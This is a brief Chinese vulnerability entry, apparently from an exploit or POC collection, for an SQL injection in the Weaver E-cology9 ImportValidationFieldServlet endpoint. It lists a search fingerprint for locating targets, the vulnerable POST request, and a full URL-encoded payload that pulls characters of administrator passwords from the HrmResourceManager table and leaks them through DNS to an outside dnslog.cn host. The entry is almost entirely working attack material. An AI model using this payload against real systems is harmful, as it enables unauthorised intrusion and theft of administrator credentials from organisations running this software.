# 泛微E-cology9ImportValidationFieldServlet存在SQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`app="泛微-OA（e-cology）"`
- **请求**：`POST /weaver/weaver.formmode.setup.ImportValidationFieldServlet/login HTTP/1.1`

**Payload**
```
action=select&type=1&modeid=%27and-0%3D%27%27and-0%3E%28select-1from+fn_trace_gettable%28%27%5C%5C%27%2Bchar%28-%28select-unicode%28%7Bfn+substring%28password%2C1%2C1%29%7D%29from+HrmResourceManager%29%29%2B%271.333.ovsbzz.dnslog.cn%5Cfoo.trc%27%2Cdefault%29%29and-0%3D%27&selfieldid=1&fieldids=1&rownum=1
```
- **响应特征**：200